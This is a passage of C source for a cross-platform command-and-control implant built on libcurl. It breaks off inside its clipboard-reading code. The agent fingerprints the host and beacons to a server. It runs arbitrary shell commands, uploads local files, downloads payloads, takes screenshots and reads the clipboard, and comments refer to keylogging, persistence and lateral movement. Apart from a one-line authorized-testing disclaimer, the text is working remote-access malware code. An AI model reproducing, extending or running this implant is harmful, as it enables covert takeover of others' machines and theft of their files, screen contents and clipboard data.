/*
 * agent.c — C2 agent, C port (libcurl).
 *
 * Build:
 *   gcc -o agent agent.c -lcurl
 *   # or with debug:
 *   gcc -g -o agent agent.c -lcurl
 * Run:
 *   ./agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN> --interval 10 --verbose
 *   C2_SERVER=... C2_TOKEN=... ./agent
 *
 * Only use against systems you own or are authorized to test.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <curl/curl.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <direct.h>
#include <lmcons.h>
#define popen _popen
#define pclose _pclose
#define PATH_SEP '\\'
#define HOME_ENV "USERPROFILE"
#else
#include <dirent.h>
#include <pthread.h>
#include <poll.h>
#include <pwd.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define PATH_SEP '/'
#define HOME_ENV "HOME"
#endif

/* ---------------------------------------------------------------- constants */

#define SHELL_TIMEOUT   120
#define OUTPUT_LIMIT    12000
#define MAX_RESPONSE    (1024 * 1024)
#define STATE_FILENAME  ".c2agent_c.json"
#define KEYLOG_LIMIT    32768

/* ---------------------------------------------------------------- globals */

static char g_server[2048]   = "";
static char g_token[1024]    = "";
static char g_agent_id[128]  = "";
static int  g_interval       = 10;
static int  g_jitter         = 0;
static int  g_verbose        = 0;
static char g_self_path[4096] = "";  /* argv[0], used by persistence/lateral */

/* ---------------------------------------------------------------- helpers */

static void logmsg(const char *fmt, ...) {
    if (!g_verbose) return;
    va_list args;
    fprintf(stderr, "[*] ");
    va_start(args, fmt);
    vfprintf(stderr, fmt, args);
    va_end(args);
    fprintf(stderr, "\n");
}

static void truncate_output(const char *in, char *out, size_t out_size) {
    size_t len = strlen(in);
    if (len <= OUTPUT_LIMIT) {
        strncpy(out, in, out_size - 1);
        out[out_size - 1] = '\0';
        return;
    }
    size_t head = OUTPUT_LIMIT / 5;
    size_t tail = OUTPUT_LIMIT - head - 40;
    size_t omitted = len - head - tail;
    snprintf(out, out_size, "%.*s\n... [%zu chars truncated] ...\n%.*s",
             (int)head, in, omitted, (int)tail, in + len - tail);
}

static char *local_ip(void) {
    static char ip[64] = "";
    /* Try connecting UDP to 8.8.8.8 to find local IP */
#ifdef _WIN32
    /* Windows: use GetAdaptersInfo or similar — simplified version */
    return "";
#else
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return "";
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    inet_pton(AF_INET, "8.8.8.8", &addr.sin_addr);
    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return "";
    }
    struct sockaddr_in local;
    socklen_t len = sizeof(local);
    getsockname(fd, (struct sockaddr *)&local, &len);
    close(fd);
    inet_ntop(AF_INET, &local.sin_addr, ip, sizeof(ip));
    return ip;
#endif
}

static const char *get_os_name(void) {
#ifdef _WIN32
    return "windows";
#elif defined(__APPLE__)
    return "darwin";
#elif defined(__linux__)
    return "linux";
#else
    return "unknown";
#endif
}

static const char *get_arch(void) {
    static char arch[64] = "unknown";
#ifdef _WIN32
    {
        SYSTEM_INFO si;
        GetNativeSystemInfo(&si);
        switch (si.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64:   strncpy(arch, "x86_64", sizeof(arch) - 1); break;
            case PROCESSOR_ARCHITECTURE_ARM64:   strncpy(arch, "arm64", sizeof(arch) - 1); break;
            case PROCESSOR_ARCHITECTURE_INTEL:   strncpy(arch, "x86", sizeof(arch) - 1); break;
            case PROCESSOR_ARCHITECTURE_ARM:     strncpy(arch, "arm", sizeof(arch) - 1); break;
            default:                             strncpy(arch, "unknown", sizeof(arch) - 1); break;
        }
        arch[sizeof(arch) - 1] = '\0';
    }
#else
    {
        struct utsname u;
        if (uname(&u) == 0 && u.machine[0])
            strncpy(arch, u.machine, sizeof(arch) - 1);
    }
#endif
    return arch;
}

static const char *get_hostname(void) {
    static char hostname[256] = "unknown";
#ifdef _WIN32
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
#else
    if (gethostname(hostname, sizeof(hostname)) != 0)
        strcpy(hostname, "unknown");
#endif
    return hostname;
}

static const char *get_username(void) {
    static char user[256] = "";
    if (user[0]) return user;
#ifdef _WIN32
    DWORD size = sizeof(user);
    GetUserNameA(user, &size);
#else
    struct passwd *pw = getpwuid(getuid());
    if (pw) strncpy(user, pw->pw_name, sizeof(user) - 1);
    else {
        char *eu = getenv("USER");
        if (eu) strncpy(user, eu, sizeof(user) - 1);
        else strcpy(user, "unknown");
    }
#endif
    return user;
}

static char *state_path(void) {
    static char path[1024] = "";
    if (path[0]) return path;
    const char *home = getenv(HOME_ENV);
    if (!home) home = ".";
    snprintf(path, sizeof(path), "%s%c%s", home, PATH_SEP, STATE_FILENAME);
    return path;
}

/* ---------------------------------------------------------------- simple JSON helpers (enough for our protocol) */

/* Find a string value in a flat JSON object: "key":"value" */
static int json_find_string(const char *json, const char *key, char *val, size_t val_size) {
    char needle[256];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return -1;
    p = strchr(p + strlen(needle), ':');
    if (!p) return -1;
    p++;
    while (*p == ' ' || *p == '\t') p++;
    if (*p == '"') {
        p++;
        const char *end = p;
        while (*end && *end != '"') {
            if (*end == '\\') end++;
            end++;
        }
        size_t len = end - p;
        if (len >= val_size) len = val_size - 1;
        memcpy(val, p, len);
        val[len] = '\0';
        return 0;
    }
    /* Number or boolean */
    const char *end = p;
    while (*end && *end != ',' && *end != '}' && *end != ' ') end++;
    size_t len = end - p;
    if (len >= val_size) len = val_size - 1;
    memcpy(val, p, len);
    val[len] = '\0';
    return 0;
}

/* ---------------------------------------------------------------- curl helpers */

/* libcurl verifies TLS certificates by default. Operators using self-signed
 * test certificates can suppress that explicitly with C2_INSECURE_TLS=1. */
static long tls_no_verify(void) {
    const char *e = getenv("C2_INSECURE_TLS");
    if (e && (strcmp(e, "1") == 0 || strcmp(e, "true") == 0 || strcmp(e, "yes") == 0)) {
        logmsg("TLS certificate verification disabled via C2_INSECURE_TLS=1");
        return 0L;
    }
    return 1L;
}

struct write_buffer {
    char *data;
    size_t size;
};

static size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
    struct write_buffer *buf = (struct write_buffer *)userdata;
    size_t total = size * nmemb;
    char *new_data = realloc(buf->data, buf->size + total + 1);
    if (!new_data) return 0;
    buf->data = new_data;
    memcpy(buf->data + buf->size, ptr, total);
    buf->size += total;
    buf->data[buf->size] = '\0';
    return total;
}

static int post_json(const char *path, const char *json_body, char *response, size_t resp_size) {
    char url[2048];
    snprintf(url, sizeof(url), "%s%s", g_server, path);

    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    struct write_buffer buf = { malloc(1), 0 };
    buf.data[0] = '\0';

    struct curl_slist *headers = NULL;
    char auth_header[1200];
    snprintf(auth_header, sizeof(auth_header), "X-Agent-Token: %s", g_token);
    headers = curl_slist_append(headers, auth_header);
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, tls_no_verify());

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        free(buf.data);
        return -1;
    }

    if (response && resp_size > 0) {
        strncpy(response, buf.data, resp_size - 1);
        response[resp_size - 1] = '\0';
    }
    free(buf.data);
    return (int)http_code;
}

static int get_url_to_buf(const char *path, char *response, size_t resp_size) {
    char url[2048];
    snprintf(url, sizeof(url), "%s%s", g_server, path);

    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    struct write_buffer buf = { malloc(1), 0 };
    buf.data[0] = '\0';

    struct curl_slist *headers = NULL;
    char auth_header[1200];
    snprintf(auth_header, sizeof(auth_header), "X-Agent-Token: %s", g_token);
    headers = curl_slist_append(headers, auth_header);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, tls_no_verify());

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        free(buf.data);
        return -1;
    }

    if (response && resp_size > 0) {
        strncpy(response, buf.data, resp_size - 1);
        response[resp_size - 1] = '\0';
    }
    free(buf.data);
    return (int)http_code;
}

static int get_url_to_file(const char *path, const char *dest_file) {
    char url[2048];
    snprintf(url, sizeof(url), "%s%s", g_server, path);

    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    FILE *fp = fopen(dest_file, "wb");
    if (!fp) { curl_easy_cleanup(curl); return -1; }

    struct curl_slist *headers = NULL;
    char auth_header[1200];
    snprintf(auth_header, sizeof(auth_header), "X-Agent-Token: %s", g_token);
    headers = curl_slist_append(headers, auth_header);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 120L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, tls_no_verify());

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    fclose(fp);

    if (res != CURLE_OK || http_code != 200) {
        unlink(dest_file);
        return -1;
    }
    return 0;
}

static int upload_file(const char *path, const char *task_id) {
    char url[2048];
    snprintf(url, sizeof(url), "%s/api/files/%s", g_server, task_id);

    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    curl_mime *mime = curl_mime_init(curl);
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_filedata(part, path);

    struct curl_slist *headers = NULL;
    char auth_header[1200];
    snprintf(auth_header, sizeof(auth_header), "X-Agent-Token: %s", g_token);
    headers = curl_slist_append(headers, auth_header);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 300L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, tls_no_verify());

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_mime_free(mime);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK && http_code == 200) ? 0 : -1;
}

/* ---------------------------------------------------------------- state */

static void load_id(void) {
    FILE *fp = fopen(state_path(), "r");
    if (!fp) return;
    char buf[256] = "";
    fread(buf, 1, sizeof(buf) - 1, fp);
    fclose(fp);
    json_find_string(buf, "agent_id", g_agent_id, sizeof(g_agent_id));
}

static void save_id(void) {
    FILE *fp = fopen(state_path(), "w");
    if (!fp) return;
    fprintf(fp, "{\"agent_id\":\"%s\"}", g_agent_id);
    fclose(fp);
}

/* ------------------------------------------------------------- lifecycle */

static size_t json_escape(const char *in, char *out, size_t out_size); /* fwd */

static void register_agent(void) {
    char e_host[512], e_user[256], e_os[128], e_arch[128], e_ip[128];
    json_escape(get_hostname(), e_host, sizeof(e_host));
    json_escape(get_username(), e_user, sizeof(e_user));
    json_escape(get_os_name(), e_os, sizeof(e_os));
    json_escape(get_arch(), e_arch, sizeof(e_arch));
    json_escape(local_ip(), e_ip, sizeof(e_ip));

    char body[4096];
    snprintf(body, sizeof(body),
        "{\"agent_id\":\"%s\",\"hostname\":\"%s\",\"username\":\"%s\","
        "\"os\":\"%s\",\"arch\":\"%s\",\"pid\":%d,\"ip\":\"%s\",\"version\":\"1.0\",\"type\":\"C\"}",
        g_agent_id,
        e_host,
        e_user,
        e_os,
        e_arch,
        (int)getpid(),
        e_ip);

    logmsg("registering with %s", g_server);
    char resp[1024] = "";
    int code = post_json("/api/register", body, resp, sizeof(resp));
    if (code != 200) {
        fprintf(stderr, "register failed: HTTP %d — will retry on next checkin\n", code);
        return;
    }
    json_find_string(resp, "agent_id", g_agent_id, sizeof(g_agent_id));
    save_id();
    logmsg("agent id: %s", g_agent_id);
}

static int checkin(char *resp, size_t resp_size) {
    char body[512];
    snprintf(body, sizeof(body), "{\"agent_id\":\"%s\"}", g_agent_id);
    int code = post_json("/api/checkin", body, resp, resp_size);
    if (code == 404) {
        logmsg("server does not know us — re-registering");
        register_agent();
        resp[0] = '\0';
        return 0;
    }
    return code;
}

/* Escape a string for inclusion inside a JSON string literal. */
static size_t json_escape(const char *in, char *out, size_t out_size) {
    size_t j = 0;
    if (!in) in = "";
    for (; *in && j + 6 < out_size; in++) {
        unsigned char c = (unsigned char)*in;
        switch (c) {
            case '"':  out[j++]='\\'; out[j++]='"';  break;
            case '\\': out[j++]='\\'; out[j++]='\\'; break;
            case '\n': out[j++]='\\'; out[j++]='n';  break;
            case '\r': out[j++]='\\'; out[j++]='r';  break;
            case '\t': out[j++]='\\'; out[j++]='t';  break;
            case '\b': out[j++]='\\'; out[j++]='b';  break;
            case '\f': out[j++]='\\'; out[j++]='f';  break;
            default:
                if (c < 0x20) { /* other control chars -> \u00XX */
                    out[j++]='\\'; out[j++]='u'; out[j++]='0'; out[j++]='0';
                    out[j++]="0123456789abcdef"[c>>4]; out[j++]="0123456789abcdef"[c&15];
                } else {
                    out[j++]=c;
                }
        }
    }
    if (j < out_size) out[j] = '\0';
    else out[out_size-1] = '\0';
    return j;
}

static void report_result(const char *task_id, const char *output, int exit_code, const char *error) {
    char esc_out[OUTPUT_LIMIT * 2 + 16];
    char esc_err[1024];
    json_escape(output, esc_out, sizeof(esc_out));
    json_escape(error ? error : "", esc_err, sizeof(esc_err));

    char body[OUTPUT_LIMIT * 2 + 2048];
    snprintf(body, sizeof(body),
        "{\"agent_id\":\"%s\",\"task_id\":\"%s\",\"output\":\"%s\","
        "\"exit_code\":%d,\"error\":\"%s\"}",
        g_agent_id, task_id, esc_out, exit_code, esc_err);
    post_json("/api/result", body, NULL, 0);
}

/* ---------------------------------------------------------------- tasks */

static int run_shell(const char *command, int timeout, char *output, size_t out_size) {
    logmsg("executing: %s", command);
    if (timeout < 1) timeout = 1;

#ifdef _WIN32
    /* Windows: run cmd.exe via CreateProcess, redirect output to a temp file,
     * and enforce the deadline with WaitForSingleObject + taskkill /T. */
    char tmpdir[MAX_PATH] = "";
    GetTempPathA(sizeof(tmpdir), tmpdir);
    DWORD self_pid = GetCurrentProcessId();
    char bat[MAX_PATH], outpath[MAX_PATH];
    snprintf(bat, sizeof(bat), "%sc2run_%lu.cmd", tmpdir, (unsigned long)self_pid);
    snprintf(outpath, sizeof(outpath), "%sc2run_%lu.out", tmpdir, (unsigned long)self_pid);

    FILE *bf = fopen(bat, "w");
    if (!bf) {
        snprintf(output, out_size, "failed to create command script");
        return 1;
    }
    fprintf(bf, "@echo off\r\n%s 2>&1\r\nexit /b %%ERRORLEVEL%%\r\n", command);
    fclose(bf);

    char cmdline[MAX_PATH + 64];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /C \"%s\" > \"%s\"", bat, outpath);

    STARTUPINFOA si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        remove(bat);
        snprintf(output, out_size, "failed to start command");
        return 1;
    }

    DWORD waitms = (timeout > 0) ? (DWORD)timeout * 1000u : 1000000u;
    DWORD wr = WaitForSingleObject(pi.hProcess, waitms);
    DWORD code = 1;
    if (wr == WAIT_TIMEOUT) {
        char tkline[96];
        snprintf(tkline, sizeof(tkline), "taskkill /PID %lu /T /F >NUL 2>&1", (unsigned long)pi.dwProcessId);
        system(tkline);
        WaitForSingleObject(pi.hProcess, 5000);
        code = 124; /* mirror timeout(1) */
    } else {
        GetExitCodeProcess(pi.hProcess, &code);
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    output[0] = '\0';
    FILE *of = fopen(outpath, "rb");
    if (of) {
        size_t total = fread(output, 1, out_size - 1, of);
        output[total] = '\0';
        fclose(of);
    }
    remove(bat);
    remove(outpath);

    if (code == 124) {
        snprintf(output, out_size, "command timed out (%ds)", timeout);
        return 124;
    }
    truncate_output(output, output, out_size);
    return (int)code;
#else
    /* POSIX: fork + exec + select loop with a hard deadline. */
    int pfd[2];
    if (pipe(pfd) != 0) {
        snprintf(output, out_size, "pipe failed");
        return 1;
    }
    pid_t pid = fork();
    if (pid < 0) {
        close(pfd[0]);
        close(pfd[1]);
        snprintf(output, out_size, "fork failed");
        return 1;
    }
    if (pid == 0) {
        /* child */
        close(pfd[0]);
        dup2(pfd[1], STDOUT_FILENO);
        dup2(pfd[1], STDERR_FILENO);
        close(pfd[1]);
        execl("/bin/sh", "sh", "-c", command, (char *)NULL);
        _exit(127);
    }
    close(pfd[1]);

    size_t total = 0;
    int elapsed_ms = 0;
    const int deadline_ms = timeout * 1000;
    int status = 0;
    int timed_out = 0;

    while (1) {
        pid_t w = waitpid(pid, &status, WNOHANG);
        if (w == pid || w < 0) break;

        int remaining = deadline_ms - elapsed_ms;
        if (remaining <= 0) {
            timed_out = 1;
            kill(pid, SIGKILL);
            waitpid(pid, &status, 0);
            break;
        }

        fd_set rset;
        FD_ZERO(&rset);
        FD_SET(pfd[0], &rset);
        struct timeval tv;
        tv.tv_sec = remaining / 1000;
        tv.tv_usec = (remaining % 1000) * 1000;

        struct timeval t0, t1;
        gettimeofday(&t0, NULL);
        int sel = select(pfd[0] + 1, &rset, NULL, NULL, &tv);
        gettimeofday(&t1, NULL);
        elapsed_ms += (int)((t1.tv_sec - t0.tv_sec) * 1000 + (t1.tv_usec - t0.tv_usec) / 1000);

        if (sel < 0) break;
        if (sel == 0) continue; /* loop re-checks the deadline */

        char buf[4096];
        ssize_t n = read(pfd[0], buf, sizeof(buf));
        if (n <= 0) break;
        if (total + (size_t)n < out_size - 1) {
            memcpy(output + total, buf, (size_t)n);
            total += (size_t)n;
        }
    }

    /* drain anything left after child exit, bounded by select(1s) so a
     * backgrounded grandchild holding the pipe open can't hang us */
    {
        char buf[4096];
        struct timeval tv;
        fd_set rset;
        FD_ZERO(&rset);
        FD_SET(pfd[0], &rset);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        while (select(pfd[0] + 1, &rset, NULL, NULL, &tv) > 0) {
            ssize_t n = read(pfd[0], buf, sizeof(buf));
            if (n <= 0) break;
            if (total + (size_t)n < out_size - 1) {
                memcpy(output + total, buf, (size_t)n);
                total += (size_t)n;
            }
            FD_ZERO(&rset);
            FD_SET(pfd[0], &rset);
            tv.tv_sec = 1;
            tv.tv_usec = 0;
        }
    }
    output[total] = '\0';
    close(pfd[0]);

    if (timed_out) {
        snprintf(output, out_size, "command timed out (%ds)", timeout);
        return 124; /* mirror timeout(1) */
    }
    int exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : 1;
    truncate_output(output, output, out_size);
    return exit_code;
#endif
}

/* basename() that is portable across MSVC/POSIX and tolerant of both separators */
static const char *path_base(const char *path) {
    if (!path || !*path) return "";
    const char *s = strrchr(path, '/');
    const char *b = strrchr(path, '\\');
    const char *sep = s;
    if (b && (!sep || b > sep)) sep = b;
    return sep ? sep + 1 : path;
}

/* create every directory component of path (POSIX 0755 / Win mkdir) */
static void mkdirs(const char *path) {
    char tmp[1024];
    size_t len = strlen(path);
    if (len == 0 || len >= sizeof(tmp)) return;
    memcpy(tmp, path, len + 1);

    size_t start = 1;
#ifdef _WIN32
    if (len > 2 && tmp[1] == ':') start = 3; /* skip "C:" */
    char *bp = tmp;
    while (*bp) {
        if (*bp == '/') *bp = '\\';
        bp++;
    }
#endif
    for (size_t i = start; i < len; i++) {
        if (tmp[i] == '/' || tmp[i] == '\\') {
            char save = tmp[i];
            tmp[i] = '\0';
#ifdef _WIN32
            if (tmp[0] && tmp[strlen(tmp) - 1] != ':') _mkdir(tmp);
#else
            mkdir(tmp, 0755);
#endif
            tmp[i] = save;
        }
    }
}

static void task_download(const char *task_id, const char *args_json, char *output, size_t out_size, int *exit_code) {
    char fname[512] = "payload.bin";
    char dest[1024] = "";
    json_find_string(args_json, "file", fname, sizeof(fname));
    json_find_string(args_json, "destination", dest, sizeof(dest));

    size_t dl = strlen(dest);
    struct stat dst;
    int dest_is_dir = 0;
    if (dl == 0) {
        strncpy(dest, fname, sizeof(dest) - 1);
    } else if (dest[dl - 1] == '/' || dest[dl - 1] == '\\') {
        dest_is_dir = 1;
    } else if (stat(dest, &dst) == 0 && (dst.st_mode & S_IFMT) == S_IFDIR) {
        dest_is_dir = 1;
    }
    if (dest_is_dir) {
        /* keep the remote basename inside the existing/new folder */
        if (dest[dl - 1] == '/' || dest[dl - 1] == '\\') dl--; /* strip trailing sep */
        size_t need = dl + strlen(path_base(fname)) + 1;
        if (need < sizeof(dest)) {
            snprintf(dest + dl, sizeof(dest) - dl, "%c%s", PATH_SEP, path_base(fname));
        }
    }

    /* create parent directory so the download never fails on a missing folder */
    {
        char parent[1024];
        size_t plen = strlen(dest);
        if (plen >= sizeof(parent)) plen = sizeof(parent) - 1;
        memcpy(parent, dest, plen);
        parent[plen] = '\0';
        char *slash = NULL;
        for (char *cp = parent; *cp; cp++) {
            if (*cp == '/' || *cp == '\\') slash = cp;
        }
        if (slash) {
            *slash = '\0';
            if (parent[0]) mkdirs(parent);
        }
    }

    logmsg("downloading %s to %s", fname, dest);

    char url_path[512];
    snprintf(url_path, sizeof(url_path), "/api/files/%s", task_id);

    if (get_url_to_file(url_path, dest) != 0) {
        snprintf(output, out_size, "download failed");
        *exit_code = 1;
        return;
    }

    struct stat st;
    stat(dest, &st);
    snprintf(output, out_size, "saved %ld bytes to %s", (long)st.st_size, dest);
    *exit_code = 0;
}

static void task_upload(const char *task_id, const char *args_json, char *output, size_t out_size, int *exit_code) {
    char path[1024] = "";
    json_find_string(args_json, "path", path, sizeof(path));
    if (!path[0]) {
        snprintf(output, out_size, "no path given");
        *exit_code = 1;
        return;
    }

    struct stat st;
    if (stat(path, &st) != 0) {
        snprintf(output, out_size, "file not found: %s", path);
        *exit_code = 1;
        return;
    }

    logmsg("uploading %s", path);

    if (upload_file(path, task_id) == 0) {
        snprintf(output, out_size, "uploaded %s", path);
        *exit_code = 0;
    } else {
        snprintf(output, out_size, "upload failed");
        *exit_code = 1;
    }
}

static void task_screenshot(const char *task_id, const char *args_json, char *output, size_t out_size, int *exit_code) {
    char label[256] = "screenshot";
    json_find_string(args_json, "name", label, sizeof(label));
    if (!label[0]) strncpy(label, "screenshot", sizeof(label) - 1);

    /* Build a temp file path */
    char tmp[1024];
#ifdef _WIN32
    const char *tmpdir = getenv("TEMP");
    if (!tmpdir) tmpdir = ".";
    snprintf(tmp, sizeof(tmp), "%s\\c2shot_%d.png", tmpdir, (int)getpid());
#else
    snprintf(tmp, sizeof(tmp), "/tmp/c2shot_%d.png", (int)getpid());
#endif

#ifdef _WIN32
    {
        char tmpfwd[1024];
        size_t i;
        for (i = 0; tmp[i]; i++) tmpfwd[i] = (tmp[i] == '\\') ? '/' : tmp[i];
        tmpfwd[i] = '\0';
        char ps[4608];
        snprintf(ps, sizeof(ps),
            "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
            "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
            "$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);"
            "$g=[System.Drawing.Graphics]::FromImage($bmp);"
            "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);"
            "$bmp.Save('%s');", tmpfwd);
        /* must run via powershell -command — cmd /C cannot execute PS syntax */
        char full[4800];
        snprintf(full, sizeof(full), "powershell -NoProfile -command \"%s\"", ps);
        system(full);
    }
#elif defined(__APPLE__)
    {
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "screencapture -x \"%s\"", tmp);
        system(cmd);
    }
#else
    {
        char cmd[2048];
        snprintf(cmd, sizeof(cmd),
            "(command -v import && import -window root \"%s\") || "
            "(command -v scrot && scrot \"%s\") || "
            "(command -v gnome-screenshot && gnome-screenshot -f \"%s\")",
            tmp, tmp, tmp);
        system(cmd);
    }
#endif

    struct stat st;
    if (stat(tmp, &st) != 0 || st.st_size == 0) {
        remove(tmp);
        snprintf(output, out_size, "error: screenshot failed");
        *exit_code = 1;
        return;
    }

    char url[2048];
    snprintf(url, sizeof(url), "%s/api/files/%s", g_server, task_id);

    CURL *curl = curl_easy_init();
    if (!curl) {
        remove(tmp);
        snprintf(output, out_size, "error: curl init failed");
        *exit_code = 1;
        return;
    }

    curl_mime *mime = curl_mime_init(curl);
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_filedata(part, tmp);
    {
        char fname[1024];
        snprintf(fname, sizeof(fname), "%s.png", label);
        curl_mime_filename(part, fname);
    }
    curl_mime_type(part, "image/png");

    struct curl_slist *headers = NULL;
    char auth_header[1200];
    snprintf(auth_header, sizeof(auth_header), "X-Agent-Token: %s", g_token);
    headers = curl_slist_append(headers, auth_header);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 300L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, tls_no_verify());

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_mime_free(mime);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    remove(tmp);

    if (res != CURLE_OK || http_code != 200) {
        snprintf(output, out_size, "screenshot upload failed: HTTP %ld", http_code);
        *exit_code = 1;
        return;
    }
    snprintf(output, out_size, "screenshot saved (%s.png)", label);
    *exit_code = 0;
}

static void task_clipboard(const char *args_json, char *output, size_t out_size, int *exit_code) {
    char action[32] = "get";
    json_find_string(args_json, "action", action, sizeof(action));
    if (strcmp(action, "set") == 0) {
        char text[8192] = "";
        json_find_string(args_json, "text", text, sizeof(text));
        int set_ok = 0;
#ifdef _WIN32
        {
            /* pipe raw bytes into Set-Clipboard; avoids all quoting/cmd-% issues */
            FILE *fp = _popen("powershell -NoProfile -command \"Set-Clipboard -Value ([Console]::In.ReadToEnd())\"", "w");
            if (!fp) {
                snprintf(output, out_size, "clipboard set failed");
                *exit_code = 1;
                return;
            }
            fwrite(text, 1, strlen(text), fp);
            set_ok = (_pclose(fp) == 0);
        }
#elif defined(__APPLE__)
        {
            FILE *fp = popen("pbcopy", "w");
            if (!fp) {
                snprintf(output, out_size, "clipboard set failed");
                *exit_code = 1;
                return;
            }
            fwrite(text, 1, strlen(text), fp);
            set_ok = (pclose(fp) == 0);
        }
#else
        {
            FILE *fp = popen("xclip -selection clipboard", "w");
            if (fp) {
                fwrite(text, 1, strlen(text), fp);
                set_ok = (pclose(fp) == 0);
            }
            if (!set_ok) {
                fp = popen("xsel --clipboard --input", "w");
                if (fp) {
                    fwrite(text, 1, strlen(text), fp);
                    set_ok = (pclose(fp) == 0);
                }
            }
        }
#endif
        if (!set_ok) {
            snprintf(output, out_size, "error: no clipboard tool available");
            *exit_code = 1;
            return;
        }
        snprintf(output, out_size, "clipboard set");
        *exit_code = 0;
        return;
    }

    /* get */
#ifdef _WIN32
    {
        FILE *fp = _popen("powershell -NoProfile -command \"Get-Clipboard\"", "r");
        if (!fp) {
            snprintf(output, out_size, "clipboard read failed");
            *exit_code = 1;
            return;
        }
        size_t total = 0;
        char buf[1024];
        while (fgets(buf, sizeof(buf), fp) && total + sizeof(buf) < out_size) {
            size_t len = strlen(buf);
            if (total + len < out_size) { memcpy(output + total, buf, len); total += len; }
        }
        _pclose(fp);
        output[total] = '\0';
        /* trim trailing newline(s) */
        while (total > 0 && (output[total-1] == '\n' || output[total-1] == '\r'))
            output[--total] = '\0';
        *exit_code = 0;
    }
#elif defined(__APPLE__)
    {
        FILE *fp = popen("pbpaste", "r");
        if (!fp) {
            snprintf(output, out_size, "clipboard read failed");
            *exit_code = 1;
            return;
        }
        size_t total = 0;
        char buf[1024];
        while (fgets(buf, sizeof(buf), fp) && total + sizeof(buf) < out_size) {
            size_t len = strlen(buf);
